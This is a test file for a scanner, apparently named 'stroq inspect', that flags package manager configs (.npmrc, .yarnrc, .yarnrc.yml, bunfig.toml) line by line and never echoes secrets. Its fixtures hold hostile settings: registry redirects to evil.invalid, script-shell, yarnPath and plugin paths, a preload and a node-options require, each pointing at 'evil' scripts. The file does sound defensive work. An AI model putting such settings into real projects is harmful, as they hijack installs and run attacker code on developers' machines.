import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { isFailing, tagChanges } from '../../src/exposure/agent-change.js';
import { describe as sentenceOf, plainQuote } from '../../src/exposure/agent-report.js';
import { agentSurface } from '../../src/exposure/agent-tree.js';
import { writeFiles } from '../helpers/scratch-repo.js';

/**
 * The config of npm, yarn or bun in a fresh clone names where packages come from, the shell
 * scripts run in, code node or bun loads first, or the program yarn itself is: the next `npx`, an
 * install or a script in that folder runs it. Plain `stroq inspect` reads each such file on disk
 * and fails every line but a comment, by its file and line and a fixed label: the text of a line
 * can hold a token, so none of it is shown.
 */

const dirs: string[] = [];
afterEach(() => {
  for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true, maxRetries: 5 });
});

const folder = (files: Readonly<Record<string, string>>): string => {
  const dir = mkdtempSync(join(tmpdir(), 'stroq-package-config-'));
  dirs.push(dir);
  writeFiles(dir, files);
  return dir;
};

describe('a package manager config in plain stroq inspect', () => {
  it('fails every line but a comment, by its file and line', () => {
    const dir = folder({
      '.npmrc': '# mirror\nregistry=https://evil.invalid/\n; x\nscript-shell=./evil.sh\n',
      'app/.yarnrc.yml': 'yarnPath: .yarn/evil.cjs\nplugins:\n  - path: ./evil.cjs\n',
      'tools/bunfig.toml': 'preload = ["./evil.ts"]\n',
      '.yarnrc': 'registry "https://evil.invalid"\n',
      'pkg/.NPMRC': 'node-options=--require ./evil.js\n',
    });
    const hits = tagChanges(agentSurface(dir).hits, null).filter((h) => isFailing(h, 'any'));
    expect(hits.map((h) => `${h.file}:${h.line} ${h.kind} ${h.name}`)).toEqual([
      '.npmrc:2 agent-api-redirect package manager setting',
      '.npmrc:4 agent-api-redirect package manager setting',
      '.yarnrc:1 agent-api-redirect package manager setting',
      'app/.yarnrc.yml:1 agent-api-redirect package manager setting',
      'app/.yarnrc.yml:2 agent-api-redirect package manager setting',
      'app/.yarnrc.yml:3 agent-api-redirect package manager setting',
      'pkg/.NPMRC:1 agent-api-redirect package manager setting',
      'tools/bunfig.toml:1 agent-api-redirect package manager setting',
    ]);
  });

  it('never shows the text of a line', () => {
    const secret = 'npm_AAAAbbbbCCCCddddEEEEffff0123456789';
    const dir = folder({ '.npmrc': `//registry.npmjs.org/:_authToken=${secret}\n` });
    const hits = tagChanges(agentSurface(dir).hits, null);
    const shown = JSON.stringify(hits.map((h) => [h, sentenceOf(h, plainQuote)]));
    expect(hits).toHaveLength(1);
    expect(shown).not.toContain(secret.slice(4, 20));
    expect(shown).not.toContain('_authToken');
    expect(shown).not.toContain('registry.npmjs.org');
  });

  it('passes one that holds only comments', () => {
    const dir = folder({ '.npmrc': '# nothing here\n; nor here\n\n' });
    expect(agentSurface(dir).hits).toEqual([]);
  });
});

/**
 * npm, yarn and bun end a line at a carriage return too, so a line after a bare `\r` is a line they
 * read. A file with such a return, a NUL or another control byte fails as a whole; the rest is
 * split at `\r\n`, `\r` and `\n`. A `;` starts a comment only in the ini files, `.npmrc` and
 * `.yarnrc`: in YAML and TOML it is text.
 */
describe('the lines of a package manager config, as its program splits them', () => {
  it.each([
    ['a carriage return that ends no line', 'fund=false\rregistry=https://evil.invalid/\n'],
    ['a NUL', 'fund=false\n\u0000registry=https://evil.invalid/\n'],
    ['another control byte', 'fund=false\n\u001bregistry=https://evil.invalid/\n'],
  ])('fails a file that holds %s, as a whole', (_, text) => {
    const hits = tagChanges(agentSurface(folder({ '.npmrc': text })).hits, null);
    expect(hits.map((h) => `${h.file}:${h.line} ${h.kind} ${h.name} ${h.severity}`)).toEqual([
      '.npmrc:1 unreadable-config lines error',
    ]);
    expect(JSON.stringify(hits)).not.toContain('evil.invalid');
  });

  it('reads the lines of a file that ends them with CRLF', () => {
    const hits = agentSurface(folder({ '.npmrc': '# c\r\nfund=false\r\nregistry=x\r\n' })).hits;
    expect(hits.map((h) => `${h.line} ${h.name}`)).toEqual([
      '2 package manager setting',
      '3 package manager setting',
    ]);
  });

  it('takes a ; for a comment only in .npmrc and .yarnrc', () => {
    const dir = folder({
      '.npmrc': '; c\n',
      '.yarnrc': '; c\n',
      'a/.yarnrc.yml': '; npmRegistryServer: "https://evil.invalid"\n',
      'b/bunfig.toml': ';x = 1\n',
    });
    expect(agentSurface(dir).hits.map((h) => h.file)).toEqual(['a/.yarnrc.yml', 'b/bunfig.toml']);
  });
});
